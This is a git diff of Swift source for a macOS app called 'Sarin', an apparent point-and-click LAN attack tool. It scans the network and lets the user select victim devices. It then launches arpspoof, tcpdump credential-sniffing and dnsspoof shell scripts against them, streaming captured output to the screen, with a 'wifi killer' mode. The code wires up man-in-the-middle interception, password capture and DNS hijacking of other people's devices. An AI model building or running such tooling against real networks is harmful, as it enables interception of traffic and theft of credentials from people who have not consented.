@@ -14,8 +14,11 @@ class ViewController: NSViewController {
     
     override func viewDidLoad() {
         super.viewDidLoad()
-        attackButton.isEnabled = false
-        stopAttacksButton.isEnabled = false
+        isArp = false
+        
+        outputText.usesFindBar = true
+        startARPButton.isEnabled = false
+        stopARPButton.isEnabled = false
         
         tableView.delegate = self
         tableView.dataSource = self
@@ -34,32 +37,30 @@ class ViewController: NSViewController {
     
     //MARK: Outlets
     @IBOutlet weak var tableView: NSTableView!
-    @IBOutlet weak var progressSpinner: NSProgressIndicator!
-    @IBOutlet weak var attackButton: NSButton!
-    @IBOutlet weak var stopAttacksButton: NSButton!
-    @IBOutlet var tcpdumpView: NSTextView!
+    @IBOutlet weak var arpProgressSpinner: NSProgressIndicator!
+    @IBOutlet weak var startARPButton: NSButton!
+    @IBOutlet weak var stopARPButton: NSButton!
+    @IBOutlet var outputText: NSTextView!
+    @IBOutlet weak var attackSpinner: NSProgressIndicator!
+    @IBOutlet weak var startAttackButton: NSButton!
+    @IBOutlet weak var stopAttackButton: NSButton!
+    @IBOutlet weak var wifiKillerModeSwitch: NSButton!
+    @IBOutlet weak var configureAttackbutton: NSButton!
     
     //MARK: Variables
     var hasBeenSetup:Bool = defaults.bool(forKey: "isInstalled")
     var data:[String] = []
     var tcpdump:String = ""
-    
-    //    let location:String = defaults.string(forKey: "installLocation") ?? ""
-    
-    //    let keychain = Keychain(service: "Sarin")
-    
+    var attack:String = "tcpdump"
     var scanDict = ["ip1": "mac1","ip2": "mac2","ip3": "mac3"]
     var ipList:[String] = []
     var macList:[String] = []
     var infoList:[String] = []
     var unparsedScan:String = ""
-    @IBOutlet weak var wifiKillerModeSwitch: NSButton!
-    
     var rowIndexes:[Int] = []
-    
     var routerIP:String = ""
-    
     var currentDevices:[String] = []
+    var isArp:Bool=false
     
     //MARK: Parse Output Function
     func parseOutput(input: String){
@@ -116,14 +117,14 @@ class ViewController: NSViewController {
             self.routerIP = getRouterIP()
             self.unparsedScan = output! as String
             self.parseOutput(input: self.unparsedScan)
-            self.progressSpinner.stopAnimation(self)
+            self.arpProgressSpinner.stopAnimation(self)
             self.tableView.reloadData()
         }
     }
     
     
     @IBAction func scanLanPressed(_ sender: NSButton) {
-        progressSpinner.startAnimation(self)
+        arpProgressSpinner.startAnimation(self)
         ipList = []
         macList = []
         infoList = []
@@ -155,6 +156,7 @@ class ViewController: NSViewController {
             let task = Process.init()
             task.launchPath = "/bin/bash"
             task.arguments = (["--login",location+"/Sarin/sarin_scripts/arpspoof.sh", user,routerIP,keychain[NSUserName()]] as! [String])
+        
             task.launch()
             
             let group = DispatchGroup()
@@ -170,13 +172,8 @@ class ViewController: NSViewController {
         }
         
     }
-    @IBAction func setRouterIP(_ sender: Any) {
-        //        routerIP = ipList[tableView.selectedRowIndexes.map { Int($0) }[0]]
-        routerIP = getRouterIP()
-        tableView.reloadData()
-    }
     
-    @IBAction func attackButtonPressed(_ sender: NSButton) {
+    @IBAction func startARPButtonPressed(_ sender: NSButton) {
         for (_,ip) in getIPsFromRowIndexes().enumerated(){
             currentDevices.append(ip)
         }
@@ -185,18 +182,20 @@ class ViewController: NSViewController {
         //        print(currentDevices)
         tableView.reloadData()
         attackUsers()
-        stopAttacksButton.isEnabled = true
-        attackButton.isEnabled = false
+        stopARPButton.isEnabled = true
+        startARPButton.isEnabled = false
         wifiKillerModeSwitch.isEnabled = false
+        isArp = true
     }
     
-    @IBAction func stopAttackButtonPressed(_ sender: Any) {
+    @IBAction func stopARPButtonPressed(_ sender: Any) {
         currentDevices = []
         tableView.reloadData()
-        killall()
-        attackButton.isEnabled = true
-        stopAttacksButton.isEnabled = false
+        killall(process: "arpspoof")
+        startARPButton.isEnabled = true
+        stopARPButton.isEnabled = false
         wifiKillerModeSwitch.isEnabled = true
+        isArp = false
     }
     
     @IBAction func wifiKillModeSwitchPressed(_ sender: NSButton) {
@@ -210,33 +209,124 @@ class ViewController: NSViewController {
         }
     }
     
-    @IBAction func tcpdumpButtonPressed(_ sender: Any) {
-        //        getTcpdump()
+    @IBAction func attackButtonPressed(_ sender: Any) {
+        if (attack == "tcpdump"){
+            if isArp{
+                attackSpinner.startAnimation(self)
+                outputText.string = outputText.string + "\n########## TCPDUMP STARTED ##########\n"
+                tcpdumpCred()
+            }else{
+                outputText.string = outputText.string + "\n########## NO ARPSPOOF PROCESS FOUND...TERMINATING ##########\n"
+            }
+            
+        }else{
+            if isArp{
+                outputText.string = outputText.string + "\n########## DNSSPOOF STARTED ##########\n"
+                for (_,ip) in currentDevices.enumerated(){
+                    dnsspoof(user: ip)
+                }
+                attackSpinner.startAnimation(self)
+            }else{
+                outputText.string = outputText.string + "\n########## NO ARPSPOOF PROCESS FOUND...TERMINATING ##########\n"
+            }
+
+        }
+    }
+    
+    @IBAction func stopAttackButtonPressed(_ sender: Any) {
+        outputText.string = outputText.string + "\n********** STOPPED **********\n"
+        if (attack == "tcpdump"){
+            killall(process: "tcpdump")
+            attackSpinner.stopAnimation(self)
+        }else{
+            killall(process: "dnsspoof")
+            attackSpinner.stopAnimation(self)
+        }
         
     }
     
+    @IBAction func chooseAttack(_ sender: NSButton) {
+        
+        if sender.identifier!.rawValue == "tcpdump"{
+            attack = "tcpdump"
+            startAttackButton.title = "Start tcpdump"
+            stopAttackButton.title = "Stop tcpdump"
+            
+        }
+        if sender.identifier!.rawValue == "dnsspoof"{
+            attack = "dnsspoof"
+            startAttackButton.title = "Start dnsspoof"
+            stopAttackButton.title = "Stop dnspoof"
+        }
+    }
     
-    func getTcpdump(){
-        let task = Process.init()
-        let pipe = Pipe.init()
+    @IBAction func clearConsolePressed(_ sender: Any) {
+        outputText.string = ""
+    }
+    
+    //Mark: Function to start tcpdump and route output to NSTextView
+    func tcpdumpCred(){
+        let task = Process()
         task.launchPath = "/bin/bash"
         task.arguments = ["--login",location+"/Sarin/sarin_scripts/tcpdumpCreds.sh",keychain[NSUserName()]] as? [String]
+        
+        let pipe = Pipe()
         task.standardOutput = pipe
-        task.launch()
-        let group = DispatchGroup()
-        group.enter()
-        DispatchQueue.global().async {
-            task.waitUntilExit()
-            group.leave()
-        }
-        group.notify(queue: .main){
-            
-            let data = pipe.fileHandleForReading.readDataToEndOfFile()
-            let output = NSString(data: data, encoding: String.Encoding.utf8.rawValue)
-            self.tcpdumpView.string = output as! String
+        let outHandle = pipe.fileHandleForReading
+        outHandle.waitForDataInBackgroundAndNotify()
+        
+        var obs1 : NSObjectProtocol!
+        obs1 = NotificationCenter.default.addObserver(forName: NSNotification.Name.NSFileHandleDataAvailable,
+        object: outHandle, queue: nil){notification -> Void in
+            let data = outHandle.availableData
+            if data.count > 0 {
+                if let str = NSString(data: data, encoding: String.Encoding.utf8.rawValue) {
+                    self.outputText.string = self.outputText.string + (str as String)}
+                outHandle.waitForDataInBackgroundAndNotify()
+            } else {
+                print("EOF on stdout from process")
+                NotificationCenter.default.removeObserver(obs1 as Any)
+            }
         }
         
-        //        print(self.tcpdump)
+        var obs2 : NSObjectProtocol!
+        obs2 = NotificationCenter.default.addObserver(forName: Process.didTerminateNotification, object: task, queue: nil) { notification -> Void in
+            print("terminated")
+            NotificationCenter.default.removeObserver(obs2 as Any)
+        }
+        task.launch()
+    }
+    //Mark: Function to start dnsspoof and route output to NSTextView
+    func dnsspoof(user:String){
+        let task = Process()
+        task.launchPath = "/bin/bash"
+        task.arguments = ["--login",location+"/Sarin/sarin_scripts/dnspoof.sh",keychain[NSUserName()],location+"/dnsspoof.txt",user] as? [String]
+        
+        let pipe = Pipe()
+        task.standardOutput = pipe
+        let outHandle = pipe.fileHandleForReading
+        outHandle.waitForDataInBackgroundAndNotify()
+        
+        var obs1 : NSObjectProtocol!
+        obs1 = NotificationCenter.default.addObserver(forName: NSNotification.Name.NSFileHandleDataAvailable, object: outHandle, queue: nil){
+            notification -> Void in
+            let data = outHandle.availableData
+            if data.count > 0 {
+                if let str = NSString(data: data, encoding: String.Encoding.utf8.rawValue) {
+                    self.outputText.string = self.outputText.string + (str as String)}
+                outHandle.waitForDataInBackgroundAndNotify()
+            } else {
+                print("EOF on stdout from process")
+                NotificationCenter.default.removeObserver(obs1 as Any)
+            }
+        }
+        
+        var obs2 : NSObjectProtocol!
+        obs2 = NotificationCenter.default.addObserver(forName: Process.didTerminateNotification, object: task, queue: nil) { notification -> Void in
+            print("terminated")
+            NotificationCenter.default.removeObserver(obs2 as Any)
+        }
+        task.launch()
     }
     
     
@@ -256,14 +346,14 @@ extension ViewController:NSTableViewDataSource,NSTableViewDelegate{
         
         //        print(tableView.selectedRowIndexes.map { Int($0) })
         
-        attackButton.title = "Attack Selected Devices " + "(" + String(itemsSelected) + ")"
+        startARPButton.title = "Attack Selected Devices " + "(" + String(itemsSelected) + ")"
         
         if (itemsSelected != 0){
             if routerIP != ""{
-                attackButton.isEnabled = true
+                startARPButton.isEnabled = true
             }
         }else{
-            attackButton.isEnabled = false
+            startARPButton.isEnabled = false
         }
         
         
